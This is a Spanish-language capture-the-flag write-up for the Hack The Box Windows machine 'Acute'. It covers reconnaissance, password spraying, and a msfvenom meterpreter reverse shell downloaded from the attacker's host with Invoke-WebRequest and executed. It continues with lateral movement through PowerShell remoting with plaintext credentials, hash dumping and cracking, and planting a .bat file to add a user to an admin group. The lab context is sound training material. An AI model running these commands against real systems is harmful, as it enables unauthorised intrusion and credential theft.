---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | Acute              |
| Os                     | Windows            |
| Difficulty             | Hard               |
| Points                 | 40                 |
| IP                     | 10.10.11.145       |


## [](#header-2)Introduccion

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/Acute/Scan1.png)

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

![nmap 1](/assets/images/Acute/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

![nmap2](/assets/images/Acute/nmap2.png)

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos con:

![nmap3](/assets/images/Acute/nmap3.png)

Es raro tener una windows machine con solo 2 puertos abiertos, el certificado ssl arroja un subdominio `atsserver.acute.local` , asi que lo agregare en el /etc/hosts.

El siguiente paso, sera Fuzzear directorios, asi que usaremos gobuster.

```s
gobuster dir -u "http://atsserver.acute.local" -w /usr/share/wordlists/wfuzz/webservices/subdomains-top1million-5000.txt -t 200
```

Al visitar el directorio encontrado /aspnet_client/, se nos muestra un error de autenticacion, es raro por que no me redirigio a otra pagina. 

Segui buscando en la pagina inicial, y me encontre con potenciales usuarios y contrasenas, me fui a la pagina /about.html y me descargue un archivo .docx.


Lo siguiente fue hacerle un exiftool contra el documento, para ver mas informacion sobre el

![exiftool](/assets/images/Acute/exiftool.png)

Despues al abrir el documento, encontramos una contrasena por default `Password1!` y un usuario `Lois` y un link para acceso web con Powershell.

Acceso a usuarios: 
Intente meter contrasenas por default, pero no hubo exito, asi que recorde la lista de usuarios que venia en la pagina de /about.html y <a href="https://github.com/urbanadventurer/username-anarchy">use useranarchy</a> y el comando que use fue:

```s
sudo programs/username-anarchy/username-anarchy -i content/user_ls.txt --select-format first,first.last,f.last,flast > content/user2.lst
```

![User 2 list](/assets/images/Acute/usr2_ls.png)

Prove con cada usuario, nombre de pc Acute-PC01 la contrasena por default `Password1!` y como usuario edavies funciono.

![PowerShell Access](/assets/images/Acute/ps_access.png)

AV esta encendido, asi que no se puede establecer una conexion con meterpreter. Para poder establecer la conexion, se necesitaria un directorio que no este escaneado por el AV, asi que en la busqueda encontre que System32 no lo esta, ni Utils.

Cree un reverse shell con msfvenom:

```s
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.230 LPORT=4444 -f exe -o shell.exe
```

Lo descargue en la maquina con:

Host:

```s
python3 -m http.server 80
```

Client:

```powershell
powershell invoke-WebRequest -UseBasicParsing 10.10.14.230/shell.exe -OutFile shell.exe

./shell.exe
```

![PowerShell invoke](/assets/images/Acute/invoke.png)

Aun asi, no se pudo hacer mucho, cuando se listaron los procesos que estan ejecutandose, estaba ejecutandose una ventana de PS, asi que tome una captura de pantalla con meterpreter y me di cuenta de que PS se esta ejecutando con el usuario acute\imonks, el cual no esta en los usuarios de la maquina, supongamos que pertenece entonces a otra llamada ATSSERVER.

La cual es el gateway de la maquina que estabamos previamente, y nos damos cuenta si desde esa maquina hacemos un ping al dominio.

![ATSSERVER](/assets/images/Acute/ping_ASSERVER.png)

La maquina tambien nos dejo meter los siguientes comandos:

```powershell
$passwd = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlainText -Force

$creds = New-Object System.Management.Automation.PSCredential("acute\imonks", $passwd)

Invoke-Command -ComputerName ATSSERVER -Credential $creds -ConfigurationName dc_manage -ScriptBlock {whoami}
```

![Comandos](/assets/images/Acute/commands1.png)

Entonces podremos ver si aqui se encuentra la flag, con un:

```powershell
Invoke-Command -ComputerName ATSSERVER -Credential $creds -ConfigurationName dc_manage -ScriptBlock {ls C:/Users/imonks/Desktop/}
```

Y la leemos con:

```powershell
Invoke-Command -ComputerName ATSSERVER -Credential $creds -ConfigurationName dc_manage -ScriptBlock {cat C:/Users/imonks/Desktop/user.txt}
```

Como vemos, tambien se encuentra unarchivo wm.ps1. Tambien me di cuenta que hay de ese lado un usuario en acute\jmorgan que esta conectado a la maquina donde estamos y esta ejecutando un Get-Volume Command.

Intentaremos reemplazar el comando GVC por el reverseshell que tenemos con un:

```powershell
Invoke-Command -ComputerName ATSSERVER -Credential $creds -ConfigurationName dc_manage -ScriptBlock {((cat "C:\Users\imonks\Desktop\wm.ps1" -Raw) -replace 'Get-Volume','cmd.exe /c C:\Utils\shell.exe') | Set-Content -Path C:\Users\imonks\Desktop\wm.ps1}
```

Lo ejecutamos ahora con:

```powershell
Invoke-Command -ComputerName ATSSERVER -Credential $creds -ConfigurationName dc_manage -ScriptBlock {C:\Users\imonks\Desktop\wm.ps1}
```

![Jmorgan acces](/assets/images/Acute/jmorgan_access.png)

Nos cambiamos de proceso, a uno con mayores privilegios, y parece que pudimos obtener ahora si el hashdump que nos estaba rebotando. Este posteriormente o crackearemos.

![Hashdump](/assets/images/Acute/hashdump.png)

Con john decripter crackearemos la contrasena, con el comando:

```s
john --format=NT hashdump.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![Hashdump cracked](/assets/images/Acute/hashdump_cracked.png)

Intentaremos entrar con algun usuario con estas credenciales, con:

```powershell
$passwd = ConvertTo-SecureString "Password@123" -AsPlainText -Force

$creds = New-Object System.Management.Automation.PSCredential("acute\awallace", $passwd)

Invoke-Command -ComputerName ATSSERVER -Credential $creds -ConfigurationName dc_manage -ScriptBlock {whoami}
```

![Awallace access](/assets/images/Acute/awallace_access.png)

Ahora encontraremos un interesante keepmeon.bat que es ejecutado por Lois cada 5 minutos en:

```powershell
Invoke-Command -ComputerName ATSSERVER -Credential $creds -ConfigurationName dc_manage -ScriptBlock {ls "C:\Program Files\keepmeon"}
```

![Keep me on file](/assets/images/Acute/keepmeon.png)

Veamos que contiene dentro

```powershell
Invoke-Command -ComputerName ATSSERVER -Credential $creds -ConfigurationName dc_manage -ScriptBlock {cat "C:\Program Files\keepmeon"}
```

![Keep me on inside](/assets/images/Acute/keepmeon_bat.png)

Este .bat file checa si existe otro .bat dentro del directorio para que lo ejecute con los privilegios de Lois. Segun el .docx decia que Lois es quien puede cambiar grupos de usuario y puede ser admin.

Ahora haremos un .bat con el siguiente comando, y esperaremos unos 5 minutos para que nos mande la conexion:

```powershell
Invoke-Command -Credential $creds -ComputerName ATSSERVER -ConfigurationName dc_manage -ScriptBlock {Set-Content -Path 
'C:\Program Files\keepmeon\pwn.bat' -Value 'net group site_admin awallace /add /domain'}
```

Despues de 5 minutos, seremos administradores del sitio y podremos leer la ultima flag con:

```powershell
Invoke-Command -ComputerName ATSSERVER -Credential $creds -ConfigurationName dc_manage -ScriptBlock {cat "C:\Users\Administrator\Desktop\root.txt"}
```

![Keep me on inside](/assets/images/Acute/powned.png)